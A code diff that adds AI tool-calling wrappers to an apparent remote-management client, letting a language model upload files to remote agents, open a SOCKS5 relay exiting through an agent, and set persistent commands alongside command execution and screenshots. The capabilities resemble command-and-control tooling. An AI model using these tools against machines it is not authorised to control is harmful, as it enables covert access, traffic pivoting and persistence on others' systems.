@@ -7,6 +7,7 @@ from __future__ import annotations
 
 import json
 import os
+from pathlib import Path
 from typing import Any
 
 from rmm_cli import RmmApiClient, _default_server_url
@@ -58,6 +59,11 @@ def _resolve_session_id(client: RmmApiClient, session_ref: str) -> tuple[str | N
             return s["id"], s
 
     return None, {"error": "session_not_found", "session_ref": ref}
+
+
+def tool_health(client: RmmApiClient) -> str:
+    code, data = client.health(timeout=5)
+    return _json_result({"ok": code == 200, "status": code, "data": data})
 
 
 def tool_list_sessions(client: RmmApiClient) -> str:
@@ -191,7 +197,60 @@ def tool_queue_screenshot(client: RmmApiClient, session_ref: str) -> str:
     return _json_result({"ok": code == 200, "status": code, "data": data})
 
 
+def tool_queue_upload(
+    client: RmmApiClient,
+    session_ref: str,
+    local_path: str,
+    remote_path: str,
+) -> str:
+    sid, _ = _resolve_session_id(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, "error": "session_not_found"})
+    local = Path(local_path).expanduser()
+    if not local.is_file():
+        return _json_result({"ok": False, "error": "local_file_not_found", "path": str(local)})
+    code, data = client.upload_file(sid, str(local), remote_path)
+    return _json_result({
+        "ok": code == 200,
+        "status": code,
+        "session_id": sid,
+        "local_path": str(local),
+        "remote_path": remote_path,
+        "data": data,
+    })
+
+
+def tool_start_socks(
+    client: RmmApiClient,
+    session_ref: str,
+    port: int = 1080,
+    bind_host: str = "127.0.0.1",
+) -> str:
+    sid, _ = _resolve_session_id(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, "error": "session_not_found"})
+    code, data = client.start_socks(sid, port=port, bind_host=bind_host)
+    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})
+
+
+def tool_stop_socks(client: RmmApiClient, session_ref: str) -> str:
+    sid, _ = _resolve_session_id(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, "error": "session_not_found"})
+    code, data = client.stop_socks(sid)
+    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})
+
+
+def tool_queue_persistent(client: RmmApiClient, session_ref: str, command: str) -> str:
+    return tool_queue_command(client, session_ref, command, cmd_type="persistent")
+
+
+def tool_stop_persistent(client: RmmApiClient, session_ref: str) -> str:
+    return tool_queue_command(client, session_ref, "__STOP__", cmd_type="oneshot")
+
+
 TOOL_HANDLERS = {
+    "health": lambda c, a: tool_health(c),
     "list_sessions": lambda c, a: tool_list_sessions(c),
     "get_session": lambda c, a: tool_get_session(c, a["session_ref"]),
     "exec_command": lambda c, a: tool_exec_command(
@@ -212,6 +271,20 @@ TOOL_HANDLERS = {
     "kill_session": lambda c, a: tool_kill_session(c, a["session_ref"]),
     "queue_download": lambda c, a: tool_queue_download(c, a["session_ref"], a["remote_path"]),
     "queue_screenshot": lambda c, a: tool_queue_screenshot(c, a["session_ref"]),
+    "queue_upload": lambda c, a: tool_queue_upload(
+        c, a["session_ref"], a["local_path"], a["remote_path"]
+    ),
+    "start_socks": lambda c, a: tool_start_socks(
+        c,
+        a["session_ref"],
+        int(a.get("port", 1080)),
+        str(a.get("bind_host", "127.0.0.1")),
+    ),
+    "stop_socks": lambda c, a: tool_stop_socks(c, a["session_ref"]),
+    "queue_persistent": lambda c, a: tool_queue_persistent(
+        c, a["session_ref"], a["command"]
+    ),
+    "stop_persistent": lambda c, a: tool_stop_persistent(c, a["session_ref"]),
 }
 
 
@@ -228,6 +301,14 @@ def execute_tool(client: RmmApiClient, name: str, arguments: dict | str) -> str:
 
 
 OPENAI_TOOLS: list[dict] = [
+    {
+        "type": "function",
+        "function": {
+            "name": "health",
+            "description": "Check RMM server API health.",
+            "parameters": {"type": "object", "properties": {}},
+        },
+    },
     {
         "type": "function",
         "function": {
@@ -353,6 +434,77 @@ OPENAI_TOOLS: list[dict] = [
         "function": {
             "name": "queue_screenshot",
             "description": "Queue a screenshot capture on the agent.",
+            "parameters": {
+                "type": "object",
+                "properties": {"session_ref": {"type": "string"}},
+                "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "queue_upload",
+            "description": "Upload a local file (on the MCP host) to a remote path on the agent.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "session_ref": {"type": "string"},
+                    "local_path": {"type": "string"},
+                    "remote_path": {"type": "string"},
+                },
+                "required": ["session_ref", "local_path", "remote_path"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "start_socks",
+            "description": "Start SOCKS5 relay on the RMM server (traffic exits via agent).",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "session_ref": {"type": "string"},
+                    "port": {"type": "integer", "description": "Default 1080"},
+                    "bind_host": {"type": "string", "description": "Default 127.0.0.1"},
+                },
+                "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "stop_socks",
+            "description": "Stop SOCKS5 relay for the session.",
+            "parameters": {
+                "type": "object",
+                "properties": {"session_ref": {"type": "string"}},
+                "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "queue_persistent",
+            "description": "Set a persistent command on the agent (until stop_persistent).",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "session_ref": {"type": "string"},
+                    "command": {"type": "string"},
+                },
+                "required": ["session_ref", "command"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "stop_persistent",
+            "description": "Stop the agent persistent command (__STOP__).",
             "parameters": {
                 "type": "object",
                 "properties": {"session_ref": {"type": "string"}},
